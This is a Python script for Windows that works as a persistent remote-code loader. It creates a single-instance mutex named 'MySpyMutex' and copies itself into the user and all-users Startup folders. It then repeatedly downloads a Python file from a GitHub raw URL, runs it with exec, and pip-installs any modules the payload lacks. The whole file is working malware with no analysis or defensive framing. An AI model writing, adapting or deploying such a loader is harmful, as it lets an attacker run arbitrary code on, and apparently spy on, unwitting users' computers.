import sys
import time
import subprocess
import requests
import shutil
import os
import winreg
import ctypes
# mutex
MUTEX_NAME = "Global\\MySpyMutex"
kernel32 = ctypes.windll.kernel32
mutex = kernel32.CreateMutexW(None, False, MUTEX_NAME)
if kernel32.GetLastError() == 183:
    sys.exit()
# ---------------------------
# Startup folders
# ---------------------------
try:
    startup_paths = {
        "Current User Startup": os.path.expandvars(
            r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
        ),
        "All Users Startup": os.path.expandvars(
            r"%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup"
        ),
    }


    if getattr(sys, "frozen", False):
        current_file = sys.executable  # file .exe
    else:
        current_file = os.path.abspath(__file__)  # file .py
    destination = r"C:\Temp"
    os.makedirs(destination, exist_ok=True)
    for name, path in startup_paths.items():
        shutil.copy2(current_file, path)




    URL = "https://raw.githubusercontent.com/PhucDiamond-VN/public_file/refs/heads/main/Speech.py"

    NETWORK_DELAY = 5  # giây

    while True:
        # Tải script
        while True:
            try:
                print("[*] Downloading script...")
                code = requests.get(URL, timeout=(10, None)).text
                print("[+] Download successful.")
                break
            except (
                requests.exceptions.ConnectionError,
                requests.exceptions.Timeout,
                requests.exceptions.HTTPError,
            ) as e:
                print(f"[!] Network error: {e}")
                print(f"[*] Retrying in {NETWORK_DELAY}s...")
                time.sleep(NETWORK_DELAY)

        # Chạy script
        while True:
            try:
                exec(compile(code, URL, "exec"), {"__name__": "__main__"})
                sys.exit(0)

            except ModuleNotFoundError as e:
                module = e.name
                print(f"[!] Missing module: {module}")
                print(f"[*] Installing {module}...")

                result = subprocess.run(
                    [sys.executable, "-m", "pip", "install", module]
                )

                if result.returncode != 0:
                    print(f"[!] Failed to install {module}")
                    sys.exit(1)

                print("[+] Installed successfully. Retrying...")

            except Exception:
                raise
finally:
    kernel32.ReleaseMutex(mutex)
    kernel32.CloseHandle(mutex)
